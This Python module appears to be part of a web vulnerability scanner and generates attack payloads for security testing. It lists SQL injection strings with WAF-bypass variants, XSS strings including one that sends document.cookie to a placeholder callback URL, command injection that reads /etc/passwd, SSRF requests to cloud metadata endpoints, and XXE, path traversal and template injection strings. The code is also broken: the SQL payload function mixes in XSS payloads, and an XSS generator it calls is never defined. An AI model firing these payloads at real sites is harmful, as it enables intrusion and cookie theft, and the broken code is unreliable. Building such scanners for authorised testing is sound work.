"""
AI Payload Generator
Generates intelligent, context-aware payloads using AI providers
"""

from typing import Dict, List, Optional
from urllib.parse import urlparse, parse_qs
from functools import lru_cache
import hashlib
from pathlib import Path
from utils.logger import get_logger

logger = get_logger(__name__)


class AIPayloadGenerator:
    """Generate intelligent security testing payloads using AI."""

    # Placeholder domain for out-of-band (OOB) callback payloads.
    # Users MUST replace this with their own OAST server (e.g., Burp Collaborator,
    # interact.sh, or a self-hosted callback listener) before running scans.
    # Using a domain you don't control risks leaking target data to third parties.
    OAST_CALLBACK_URL = "{CALLBACK_URL}"

    def __init__(self, ai_manager, config: Dict):
        """Initialize the AI payload generator."""
        self.ai_manager = ai_manager
        self.config = config
        self.payload_config = config.get('vulnerability_scanner', {}).get('payload_generation', {})
        self.payload_cache = {}  # Cache for generated payloads
        self.use_context_aware = self.payload_config.get('context_aware', True)
        self.use_cve_database = self.payload_config.get('cve_database', True)
        self.cve_matcher = None
        
        # Initialize CVE matcher if enabled
        if self.use_cve_database:
            try:
                from modules.cve_intelligence.cve_matcher import CVEMatcher
                db_path = Path("data/cve_intelligence.db")
                if db_path.exists():
                    self.cve_matcher = CVEMatcher(str(db_path))
                    logger.info("CVE matcher initialized")
                else:
                    logger.info("CVE database not found, run CVE scraper first")
            except Exception as e:
                logger.debug(f"CVE matcher initialization failed: {e}")
        
    def generate_payloads(self, context: Dict) -> Dict[str, List[str]]:
        """
        Generate intelligent payloads based on context.
        
        Args:
            context: Dictionary containing URL, response, headers, etc.
            
        Returns:
            Dictionary mapping vulnerability types to payload lists
        """
        # Check cache first
        context_hash = self._hash_context(context)
        if context_hash in self.payload_cache:
            logger.debug("Using cached payloads")
            return self.payload_cache[context_hash]
        
        if not self.payload_config.get('use_ai', True):
            return self._get_default_payloads()
        
        payloads = {}
        
        try:
            # Analyze context for intelligent payload generation
            tech_stack = self._detect_technology_stack(context)
            waf_detected = self._detect_waf(context)
            
            logger.debug(f"Tech stack: {tech_stack}, WAF: {waf_detected}")
            
            # Generate optimized payloads based on context
            payloads['sql_injection'] = self._generate_sql_payloads(context, tech_stack, waf_detected)
            payloads['xss'] = self._generate_xss_payloads(context, tech_stack, waf_detected)
            payloads['command_injection'] = self._generate_command_injection_payloads(context)
            payloads['ssrf'] = self._generate_ssrf_payloads(context)
            payloads['xxe'] = self._generate_xxe_payloads(context)
            payloads['path_traversal'] = self._generate_path_traversal_payloads(context)
            payloads['lfi'] = self._generate_lfi_payloads(context)
            payloads['ssti'] = self._generate_ssti_payloads(context, tech_stack)
            
            # Enrich with CVE-based payloads if available
            if self.cve_matcher and tech_stack:
                cve_matches = self.cve_matcher.match_technology_cves(tech_stack)
                cve_payloads = self.cve_matcher.get_payloads_from_cves(cve_matches)
                
                # Merge CVE payloads with generated ones (CVE payloads first - higher priority)
                for attack_type, cve_payload_list in cve_payloads.items():
                    if attack_type in payloads and cve_payload_list:
                        # Prepend CVE payloads (they are more targeted)
                        payloads[attack_type] = cve_payload_list[:5] + payloads[attack_type]
                        logger.info(f"Added {len(cve_payload_list[:5])} CVE-based {attack_type} payloads")
            
            # Cache the generated payloads
            self.payload_cache[context_hash] = payloads
            
        except Exception as e:
            logger.error(f"Error generating AI payloads: {e}")
            payloads = self._get_default_payloads()
        
        return payloads
    
    def _hash_context(self, context: Dict) -> str:
        """Generate hash for context caching."""
        key = f"{context.get('url', '')}_{context.get('headers', {}).get('server', '')}"
        return hashlib.md5(key.encode()).hexdigest()
    
    def _detect_technology_stack(self, context: Dict) -> List[str]:
        """Detect technology stack from response."""
        tech = []
        headers = context.get('headers', {})
        response = context.get('response')
        
        # Check headers
        server = headers.get('server', '').lower()
        if 'apache' in server:
            tech.append('apache')
        if 'nginx' in server:
            tech.append('nginx')
        if 'iis' in server:
            tech.append('iis')
        
        powered_by = headers.get('x-powered-by', '').lower()
        if 'php' in powered_by:
            tech.append('php')
        if 'asp.net' in powered_by:
            tech.append('aspnet')
        
        # Check response content
        if response and hasattr(response, 'text'):
            content = response.text.lower()
            if 'wp-content' in content or 'wordpress' in content:
                tech.append('wordpress')
            if 'joomla' in content:
                tech.append('joomla')
            if 'django' in content:
                tech.append('django')
            if 'laravel' in content:
                tech.append('laravel')
            if 'express' in content or 'node' in headers.get('x-powered-by', '').lower():
                tech.append('nodejs')
        
        return tech
    
    def _detect_waf(self, context: Dict) -> bool:
        """Detect if WAF is present."""
        headers = context.get('headers', {})
        
        waf_headers = [
            'x-sucuri-id', 'x-sucuri-cache',
            'server: cloudflare', 'cf-ray',
            'x-cdn', 'x-akamai',
            'x-protected-by', 'x-security',
            'server: awselb'
        ]
        
        for header, value in headers.items():
            header_lower = header.lower()
            value_lower = str(value).lower()
            
            for waf_sig in waf_headers:
                if waf_sig in header_lower or waf_sig in value_lower:
                    return True
        
        return False
    
    def _generate_sql_payloads(self, context: Dict, tech_stack: List[str] = [], waf_detected: bool = False) -> List[str]:
        """Generate SQL injection payloads optimized for context."""
        db_type = self._detect_database_type(context, tech_stack)
        
        # Base payloads
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "' AND 1=1--",
            "' AND 1=2--",
        ]
        
        # Database-specific payloads
        if 'mysql' in db_type.lower():
            payloads.extend([
                "' AND SLEEP(5)--",
                "' AND BENCHMARK(5000000,MD5('test'))--",
                "' AND extractvalue(1,concat(0x7e,database()))--",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
            ])
        elif 'postgresql' in db_type.lower():
            payloads.extend([
                "' AND pg_sleep(5)--",
                "' UNION SELECT NULL::text--",
                "'; SELECT pg_sleep(5)--"
            ])
        elif 'mssql' in db_type.lower():
            payloads.extend([
                "' WAITFOR DELAY '0:0:5'--",
                "' UNION SELECT NULL--",
                "'; WAITFOR DELAY '0:0:5'--"
            ])
        elif 'oracle' in db_type.lower():
            payloads.extend([
                "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
                "' UNION SELECT NULL FROM DUAL--"
            ])
        
        # WAF bypass payloads
        if waf_detected:
            payloads.extend([
                "' /**/OR/**/1=1--",
                "' %0aOR%0a1=1--",
                "' /*!50000OR*/ 1=1--",
                "' UnIoN SeLeCt NULL--",
                "'/**/AND/**/SLEEP(5)--"
            ])
        
        default_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "javascript:alert('XSS')",
            f"<script>fetch('{self.OAST_CALLBACK_URL}?c='+document.cookie)</script>",
            "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
            "\"><script>alert(String.fromCharCode(88,83,83))</script>",
            "<svg><script>alert&#40;'XSS')</script>",
            "<img src=\"x\" onerror=\"alert`1`\">",
            "<details open ontoggle=alert(1)>",
        ]
        
        # Context-specific payloads
        content_type = context.get('headers', {}).get('content-type', '').lower()
        
        if 'json' in content_type:
            payloads.extend([
                '{"xss":"<script>alert(1)</script>"}',
                '{"xss":"<img src=x onerror=alert(1)>"}'
            ])
        
        # WAF bypass payloads
        if waf_detected:
            payloads.extend([
                "<ScRiPt>alert(1)</ScRiPt>",
                "<img src=x onerror=alert`1`>",
                "<svg/onload=alert(String.fromCharCode(88,83,83))>",
                "<iframe src=\"javasc&Tab;ript:alert(1)\">",
                "<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">",
                "<svg><script>&#97;&#108;&#101;&#114;&#116;&#40;1&#41;</script>",
                "<details open ontoggle=alert(1)>",
                "<img src onerror=eval(atob('YWxlcnQoMSk='))>",
                "\"><img src=x onerror=alert(1)>"
            ])
        
        # Advanced payloads
        payloads.extend([
            "<svg><animate onbegin=alert(1)>",
            "<select autofocus onfocus=alert(1)>",
            "<textarea autofocus onfocus=alert(1)>",
            "<keygen autofocus onfocus=alert(1)>",
            "<marquee onstart=alert(1)>",
            "<isindex type=submit formaction=javascript:alert(1)>",
        ])
        
        return list(set(payloads))[:15]
    
    def _generate_command_injection_payloads(self, context: Dict) -> List[str]:
        """Generate command injection payloads."""
        default_payloads = [
            "; ls -la",
            "| ls -la",
            "& ls -la",
            "`ls -la`",
            "$(ls -la)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; whoami",
            "| whoami",
            "; sleep 5",
            "| sleep 5",
            "&& sleep 5",
            "; ping -c 5 127.0.0.1",
            "| ping -c 5 127.0.0.1",
        ]
        
        return default_payloads
    
    def _generate_ssrf_payloads(self, context: Dict) -> List[str]:
        """Generate SSRF payloads."""
        default_payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://0.0.0.0",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
            "http://[::1]",
            "http://2130706433",
            "http://0x7f000001",
        ]
        
        return default_payloads
    
    def _generate_xxe_payloads(self, context: Dict) -> List[str]:
        """Generate XXE payloads."""
        default_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{self.OAST_CALLBACK_URL}/xxe">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>',
        ]
        
        return default_payloads
    
    def _generate_path_traversal_payloads(self, context: Dict) -> List[str]:
        """Generate path traversal payloads."""
        default_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%5c..%5c..%5cwindows%5cwin.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..;/..;/..;/etc/passwd",
            "/var/www/../../etc/passwd",
        ]
        
        return default_payloads
    
    def _get_ai_response(self, prompt: str) -> List[str]:
        """Get response from AI provider."""
        try:
            response = self.ai_manager.generate(prompt)
            # Parse response into list of payloads
            payloads = [line.strip() for line in response.split('\n') if line.strip()]
            return payloads[:10]  # Limit to 10 payloads
        except Exception as e:
            logger.warning(f"Failed to get AI response: {e}")
            return []
    
    def _extract_parameters(self, context: Dict) -> str:
        """Extract URL parameters from context."""
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(context.get('url', ''))
        params = parse_qs(parsed.query)
        return ', '.join(params.keys()) if params else 'None'
    
    def _extract_input_fields(self, context: Dict) -> str:
        """Extract input fields from response."""
        # This would parse HTML and extract input fields
        return "To be implemented based on response parsing"
    
    def _generate_lfi_payloads(self, context: Dict) -> List[str]:
        """Generate LFI payloads."""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "/etc/passwd%00",
            "....\\\\....\\\\....\\\\windows\\\\win.ini",
        ]
    
    def _generate_ssti_payloads(self, context: Dict, tech_stack: List[str] = []) -> List[str]:
        """Generate SSTI payloads based on technology."""
        payloads = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"]
        
        if 'jinja' in tech_stack or 'flask' in tech_stack or 'django' in tech_stack:
            payloads.extend([
                "{{config}}",
                "{{config.items()}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
            ])
        elif 'php' in tech_stack:
            payloads.extend([
                "${7*7}",
                "{{7*7}}",
            ])
        
        return payloads
    
    def _detect_database_type(self, context: Dict, tech_stack: List[str] = []) -> str:
        """Detect database type from response headers or errors."""
        response = context.get('response')
        
        if response and hasattr(response, 'text'):
            content = response.text.lower()
            
            if 'mysql' in content or 'mysqli' in content:
                return 'MySQL'
            elif 'postgresql' in content or 'pg_' in content:
                return 'PostgreSQL'
            elif 'microsoft sql' in content or 'mssql' in content:
                return 'MSSQL'
            elif 'oracle' in content:
                return 'Oracle'
            elif 'sqlite' in content:
                return 'SQLite'
        
        # Infer from tech stack
        if 'php' in tech_stack:
            return 'MySQL'
        elif 'aspnet' in tech_stack:
            return 'MSSQL'
        elif 'django' in tech_stack or 'nodejs' in tech_stack:
            return 'PostgreSQL'
        
        return "Unknown"
    
    def _get_default_payloads(self) -> Dict[str, List[str]]:
        """Get default payload set without AI."""
        return {
            'sql_injection': self._generate_sql_payloads({}),
            'xss': self._generate_xss_payloads({}),
            'command_injection': self._generate_command_injection_payloads({}),
            'ssrf': self._generate_ssrf_payloads({}),
            'xxe': self._generate_xxe_payloads({}),
            'path_traversal': self._generate_path_traversal_payloads({})
        }
